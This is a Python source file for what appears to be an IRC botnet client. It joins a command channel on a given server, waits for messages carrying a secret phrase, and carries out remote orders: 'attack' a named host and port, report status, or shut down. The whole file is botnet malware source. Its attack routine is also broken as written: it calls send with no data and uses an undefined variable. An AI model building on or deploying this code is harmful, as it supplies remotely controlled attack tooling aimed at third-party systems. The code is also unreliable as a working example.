import sys
import socket
import random
import time

# argv check
try:
    hostname= sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    sphrase = sys.argv[4]
except Exception as err:
    print("invalid arguments: python3 bot.py <hostname> <port> <channel> <secret-phrase>")
    sys.exit()



def connect():
    while True:
        botname = "bot"+str(random.randint(0,999999))
        irc.connect((hostname, port))
        msg = "NICK " + botname + "\r\n"
        irc.send(msg.encode())
        msg = "USER "+botname+" * * : bot " + botname +"\r\n"
        irc.send(msg.encode())
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split("\r\n")
        state_code=inmsg[0].split()[1]
        # wait 5s before retrying to coneect
        if state_code != "001":
            time.sleep(5)
            continue
        else:
            if joinChannel(channel):
                break
    return

# join channel
def joinChannel(name):
    msg = "JOIN #" +name+" \r\n"
    irc.send(msg.encode())
    indata = irc.recv(1024)
    inmsg = indata.decode("utf-8").split("\r\n")
    if inmsg[0].split()[1] == "JOIN":
        print("connected")
        return True
    return False
#handles Ping msg
def ping(pingmsg):
    msg = "PONG "+pingmsg
    irc.send(msg.encode())
    print ("PONG!")
    return

#handles shutdown
def shutdown():
    irc.close()
    sys.exit()
    return
#use to handle status command
def status(masterName):
    msg = "PRIVMSG "+masterName+" :Here\r\n"
    irc.send(msg.encode())
    return
#use to attack
def attack(hostname,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.connect((hostname,int(port)))
        s.send()
        msg = "PRIVMSG "+masterName+" :success\r\n"
        irc.send(msg.encode())
    except:
        msg = "PRIVMSG "+masterName+" :fail\r\n"
        irc.send(msg.encode())
    return
#use to move
def move(hostname,port,channel):
    return
# use the listen to chat
def listen():
    while True:
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split(":")
        print(inmsg)
        if 'PING' in inmsg[0]:
            ping(inmsg[1])
        elif sphrase == (inmsg[2].split())[0]:
            print ("serving master!")
            if (inmsg[2].split())[1] == 'attack':
                attack(inmsg[2].split()[2],inmsg[2].split()[3])
            elif (inmsg[2].split())[1] == 'status':
                status(inmsg[1].split("!")[0])
            elif (inmsg[2].split())[1] == 'move':
                pass
            elif (inmsg[2].split())[1] == 'shutdown':
                shutdown()
        else:
            print("what to do?")
    return

# main=========================================================================

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
botname = ""
while True:
    connect()
    listen()
